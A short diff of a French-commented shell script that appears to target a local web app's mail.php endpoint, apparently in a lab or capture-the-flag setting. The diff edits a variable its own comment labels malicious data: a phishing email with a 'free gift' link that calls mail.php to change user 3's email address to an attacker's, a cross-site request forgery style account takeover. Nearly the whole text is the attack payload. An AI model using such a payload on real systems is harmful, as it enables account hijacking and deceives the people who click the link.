@@ -4,7 +4,7 @@
 URL="http://127.0.0.1/functions/user/mail.php"
 
 # Données malveillantes
-DATA="receiver_emails=hacker@gmail.com&title=Bravo&content=<a href='https://www/functions/user/mail.php?id=3&new_email=hacker@gmail.com'>Cliquez ici pour un cadeau!</a>&send_email=1"
+DATA="receiver_emails=hacker@gmail.com&title=Bravo&content=<a href='https://www/functions/user/mail.php?id=3&new_email=hacker2@gmail.com'>Cliquez ici pour un cadeau!</a>&send_email=1"
 
 # Points initiaux
 points=2000
